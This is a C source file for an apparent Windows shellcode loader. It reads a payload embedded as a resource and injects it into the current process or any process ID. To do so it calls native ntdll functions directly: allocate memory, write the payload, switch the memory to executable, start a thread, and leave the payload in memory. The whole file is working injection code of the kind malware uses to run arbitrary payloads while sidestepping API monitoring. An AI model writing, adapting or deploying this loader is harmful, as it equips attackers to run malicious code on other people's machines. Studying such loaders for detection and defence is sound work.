/*
--------------------------------------------------------------------------------------------
@Author: Yenn
@website:
--------------------------------------------------------------------------------------------
*/

#include "NTinject.h"
#include "resource.h"

UINT_PTR GetNativeFunctionAddress(
    _In_ HMODULE NtdllHandle,
    _In_ LPCSTR NtFunctionName
)
{
    UINT_PTR FunctionAddress = 0;
    FunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (FunctionAddress == 0)
    {
        WARN("Failed to get address of %s", NtFunctionName);
        PRINT_ERROR("GetProcAddress", GetLastError());
        return 0;
    }

    OKAY("Got address of %s: 0x%p", NtFunctionName, (PVOID)FunctionAddress);
    return FunctionAddress;
}

BOOL FetchResourceNTAPI() {
    HRSRC hResource = NULL;
    HGLOBAL hGlobal = NULL;
    PVOID pPayloadAddress = NULL;
    SIZE_T sPayloadSize = 0;

    // Find and load the resource
    hResource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hResource == NULL) {
        PRINT_ERROR("FindResourceW", GetLastError());
        return FALSE;
    }

    hGlobal = LoadResource(NULL, hResource);
    if (hGlobal == NULL) {
        PRINT_ERROR("LoadResource", GetLastError());
        return FALSE;
    }

    pPayloadAddress = LockResource(hGlobal);
    if (pPayloadAddress == NULL) {
        PRINT_ERROR("LockResource", GetLastError());
        return FALSE;
    }

    sPayloadSize = SizeofResource(NULL, hResource);
    if (sPayloadSize == 0) {
        PRINT_ERROR("SizeofResource", GetLastError());
        return FALSE;
    }

    OKAY("Payload Address: 0x%p", pPayloadAddress);
    OKAY("Payload Size: %zu bytes", sPayloadSize);
    OKAY("Press Enter to continue with NTAPI injection...");
    getchar();

    // Use pseudo-handle for current process
    return NTAPIinjector((DWORD)(LONG_PTR)-1, (LPCSTR)pPayloadAddress, sPayloadSize);
}

BOOL NTAPIinjector(
    _In_ CONST DWORD ProcessId,
    _In_ LPCSTR Payload,
    _In_ CONST SIZE_T PayloadSize
) {
    // Global Variables
    HMODULE NtdllHandle = NULL;
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle = NULL;

    PVOID Buffer = NULL;
    BOOL State = TRUE;

    DWORD oldProtect = 0;
    SIZE_T BytesWritten = 0;
    SIZE_T PayloadSizeActual = PayloadSize;
    NTSTATUS Status = 0;
    CLIENT_ID ClientId = { (HANDLE)ProcessId, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

    // Get handle to ntdll.dll
    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        PRINT_ERROR("GetModuleHandleW", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] Successfully got address of ntdll.dll", NtdllHandle);

    // Get function addresses
    function_NtOpenProcess p_NtOpenProcess = (function_NtOpenProcess)GetNativeFunctionAddress(NtdllHandle, "NtOpenProcess");
    function_NtAllocateVirtualMemory p_NtAllocateVirtualMemory = (function_NtAllocateVirtualMemory)GetNativeFunctionAddress(NtdllHandle, "NtAllocateVirtualMemory");
    function_NtWriteVirtualMemory p_NtWriteVirtualMemory = (function_NtWriteVirtualMemory)GetNativeFunctionAddress(NtdllHandle, "NtWriteVirtualMemory");
    function_NtProtectVirtualMemory p_NtProtectVirtualMemory = (function_NtProtectVirtualMemory)GetNativeFunctionAddress(NtdllHandle, "NtProtectVirtualMemory");
    function_NtCreateThreadEx p_NtCreateThreadEx = (function_NtCreateThreadEx)GetNativeFunctionAddress(NtdllHandle, "NtCreateThreadEx");
    function_NtWaitForSingleObject p_NtWaitForSingleObject = (function_NtWaitForSingleObject)GetNativeFunctionAddress(NtdllHandle, "NtWaitForSingleObject");
    function_NtFreeVirtualMemory p_NtFreeVirtualMemory = (function_NtFreeVirtualMemory)GetNativeFunctionAddress(NtdllHandle, "NtFreeVirtualMemory");
    function_NtClose p_NtClose = (function_NtClose)GetNativeFunctionAddress(NtdllHandle, "NtClose");

    if (!p_NtOpenProcess || !p_NtAllocateVirtualMemory || !p_NtWriteVirtualMemory ||
        !p_NtProtectVirtualMemory || !p_NtCreateThreadEx || !p_NtWaitForSingleObject ||
        !p_NtFreeVirtualMemory || !p_NtClose) {
        WARN("Failed to get one or more NTAPI function addresses");
        return FALSE;
    }

    OKAY("Successfully got NTAPI function addresses");

    // Handle current process case
    if (ProcessId == (DWORD)(LONG_PTR)-1) {
        ProcessHandle = NtCurrentProcess();
        OKAY("Using current process handle");
    }
    else {
        Status = p_NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &ClientId);
        if (Status != STATUS_SUCCESS) {
            PRINT_ERROR("NtOpenProcess", Status);
            return FALSE;
        }
    }

    // Allocate memory in target process
    Status = p_NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSizeActual, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        return FALSE;
    }
    OKAY("[0x%p] Allocated %zu bytes with PAGE_READWRITE", Buffer, PayloadSizeActual);

    // Write payload to allocated memory
    Status = p_NtWriteVirtualMemory(ProcessHandle, Buffer, (PVOID)Payload, PayloadSize, &BytesWritten);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtWriteVirtualMemory", Status);
        return FALSE;
    }
    OKAY("[0x%p] Wrote %zu bytes to allocated memory", Buffer, BytesWritten);

    // Change memory protection to PAGE_EXECUTE_READ
    Status = p_NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSizeActual, PAGE_EXECUTE_READ, &oldProtect);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        return FALSE;
    }
    OKAY("[0x%p] Changed memory protection to PAGE_EXECUTE_READ", Buffer);

    // Create remote thread to execute payload
    Status = p_NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, Buffer, NULL, 0, 0, 0, 0, NULL);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        return FALSE;
    }

    OKAY("[0x%p] Created thread in target process", ThreadHandle);
    INFO("[0x%p] Waiting for thread execution to complete...", ThreadHandle);
    
    Status = p_NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtWaitForSingleObject", Status);
        return FALSE;
    }

    INFO("[0x%p] Thread execution completed. Payload remains in memory", ThreadHandle);
    OKAY("[0x%p] Payload buffer address (memory persistent)", Buffer);

    // Clean up handles but leave payload in memory
    if (ThreadHandle) p_NtClose(ThreadHandle);
    if (ProcessHandle && ProcessHandle != NtCurrentProcess()) p_NtClose(ProcessHandle);

    return TRUE;
}